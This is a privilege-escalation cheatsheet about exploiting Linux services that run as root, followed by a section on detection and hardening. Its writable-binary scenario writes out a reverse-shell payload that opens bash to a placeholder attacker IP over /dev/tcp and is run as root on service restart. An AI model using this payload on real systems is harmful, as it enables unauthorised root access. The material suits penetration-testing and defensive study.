## üö™ Cheatsheet: Service Exploitation Privilege Escalation

Services are background processes (daemons) that provide core system functionality, like a web server (Apache), a database (MySQL), or a scheduler (cron). Many of these services run with **root** privileges. An attacker can gain root on the system by either exploiting a vulnerability in the service's software itself (e.g., an unpatched bug) or by abusing weak permissions on the service's binary or configuration files.

### ## What to Look For (Reconnaissance)

An attacker needs to identify what services are running, who they are running as, and if any of them are misconfigured.

* **List Running Processes & Services:**
    ```bash
    # See all processes and their owners
    ps aux

    # Filter for processes running as root
    ps aux | grep '^root'

    # List all active services (on systemd systems)
    systemctl list-units --type=service --state=running
    ```

* **Scan for Listening Ports:**
    Use `netstat` or `ss` to see what services are listening for connections, especially on `localhost`.
    ```bash
    netstat -tulpn
    ss -tulpn
    ```

* **Check Service File Permissions:**
    Once you identify a service running as root, check the permissions of its executable and configuration files.
    ```bash
    # Find the service's executable path
    systemctl status <service-name>

    # Check permissions
    ls -l /path/to/service-binary
    ls -l /etc/service/config.conf
    ```

* **Identify Software Versions:**
    Find the version number of the service's software to search for public exploits in databases like Exploit-DB.
    ```bash
    apache2 -v
    mysql --version
    ```

---

### ## Common Exploitable Scenarios & Payloads

The goal is to hijack the execution flow of a service that runs as root.

#### **Scenario 1: Writable Service Binary**
The executable file for a service running as root is writable by a low-privileged user.

* **Exploitation:**
    1.  Find a writable service binary (e.g., `/usr/sbin/custom-service`).
    2.  Make a backup of the original binary. `mv /usr/sbin/custom-service /tmp/custom-service.bak`
    3.  Create a malicious payload (e.g., a reverse shell) and save it with the same name as the service binary.
        ```bash
        echo '#!/bin/bash' > /usr/sbin/custom-service
        echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /usr/sbin/custom-service
        chmod +x /usr/sbin/custom-service
        ```
    4.  Restart the service (or wait for a reboot/crash). The system will execute your payload as root.
        ```bash
        # If you have limited sudo rights for this action:
        sudo systemctl restart custom-service
        ```

#### **Scenario 2: Writable Configuration File**
The service's config file is writable, and the service has a feature to load modules or execute commands.

* **Exploitation (Example with Apache):**
    If `/etc/apache2/apache2.conf` is writable, an attacker could add a line to load a malicious module (`.so` file) that gives them a shell.

#### **Scenario 3: Unpatched Software Vulnerability**
A service is running an old version with a known public privilege escalation exploit.

* **Exploitation:**
    1.  Identify the version (e.g., `SomeDB v1.2.3`).
    2.  Use `searchsploit` to find an exploit for that version.
    3.  Download, compile, and run the exploit against the service to get a root shell.

---

### ## üõ°Ô∏è Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **File Integrity Monitoring (FIM):** This is the most effective defense. Use **AIDE**, **Tripwire**, or **Wazuh** to monitor all service binaries and configuration files. Any unauthorized modification should trigger an immediate alert.
* **Log Monitoring:** Watch for services that are repeatedly crashing and restarting. Check service logs in `/var/log/` or via `journalctl -u <service-name>` for errors or unusual activity.

#### **How to Prevent Service Exploitation**

* **Patch Management:** Keep all software and services up to date. Run regular vulnerability scans to identify outdated software with known exploits and apply security patches promptly.
* **Enforce Strict File Permissions:** All service executables and configuration files should be owned by `root` and should **not** be writable by other users. Use `chmod 755` for binaries and `chmod 644` for configuration files.
* **Principle of Least Privilege:** **Do not run services as root unless absolutely necessary.** Create dedicated, unprivileged user accounts for each service (e.g., `www-data` for Apache, `mysql` for MySQL). If the service is compromised, the attacker will be contained within that user's limited permissions.
* **Harden `systemd` Unit Files:** Use the built-in security features in `systemd` to sandbox your services. Add these options to the `[Service]` section of a unit file:
    * `ProtectSystem=strict`: Makes the host OS directories read-only to the service.
    * `PrivateTmp=true`: Gives the service its own private `/tmp` directory.
    * `NoNewPrivileges=true`: Prevents the service's children from gaining more privileges.
